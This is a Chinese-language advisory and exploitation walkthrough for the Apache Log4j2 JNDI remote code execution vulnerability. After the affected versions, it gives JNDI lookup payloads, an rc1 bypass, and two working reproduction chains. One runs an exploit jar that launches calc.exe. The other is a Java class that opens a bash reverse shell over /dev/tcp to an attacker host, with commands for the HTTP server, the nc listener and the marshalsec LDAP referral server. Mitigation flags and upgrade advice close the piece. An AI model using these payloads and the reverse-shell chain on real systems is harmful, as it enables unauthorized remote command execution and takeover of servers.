Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。

漏洞描述：

攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置。漏洞原理已经有大佬昨晚分析，简单总结一下，在打印日志时，如果发现日志内容中包含关键词${，那么这个里面包含的内容会当做变量来进行替换，导致攻击者可以任意执行命令。

影响版本：

2.0 <= Apache Log4j 2<= 2.15.0-rc1

可能的受影响应用包括但不限于如下：

Spring-Boot-strater-log4j2Apache Struts2Apache SolrApache FlinkApache DruidElasticSearchflumedubboRedislogstashkafka

国内威胁和影响情况


POC：

${jndi:ldap://xxxxx.dnslog.cn/exp}${jndi:rmi://xxx}

Log4j rc1绕过：加个空格即可触发

${jndi:ldap://127.0.0.1:1389/ badClassName

Apache-Log4j的几种复现方式

1：使用NDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

项目地址：https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2

vps IP 假设为 10.10.10.10 

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 10.10.10.10

然后fuzz

${jndi:ldap://10.10.10.10:1389/g6hwit}或者${jndi:ldap://10.10.10.10:1389/3xgktp}


2：反弹shell:

测试了一台linux，修改里面的host和port为要反弹的地址(/bin/bash)

Exp.java：

import java.lang.Runtime;import java.lang.Process;
class Exp {    static {      try {        Runtime rt = Runtime.getRuntime();        String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/ip/端口 0>&1"};        Process pc = rt.exec(commands);        pc.waitFor();      } catch (Exception e) {        // do nothing      }    }}

然后在vps上开http服务接着将编译好的exp.class放到web目录中

linux系统开启http服务

python3 -m http.server 80

以及监听端口nc -l 12000

然后同样在vps上

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ip/#Exp" 9999
jdni下载地址：https://github.com/RandomRobbieBF/marshalsec-jar

paylod: ${jndi:ldap://ip:9999/Exp}

效果是jdni上收到请求消息 Send LDAP reference result for dd redirecting to http://ip:9999/Exp.class
httpserver请求 [10/Dec/2021 10:04:39] "GET /Exp.class HTTP/1.1" 200
nc收到shell


解决办法：

紧急：目前漏洞POC已被公开，官方已发布安全版本，建议使用该组件的用户尽快采取安全措施。

缓解措施：

（1）. jvm参数 -Dlog4j2.formatMsgNoLookups=true    （2）.log4j2.formatMsgNoLookups=True（3）.系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true

修复方案：

升级Apache Log4j 2至最新安全版本，下载地址：

log4j-2.15.0-rc2 版本，地址 https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2
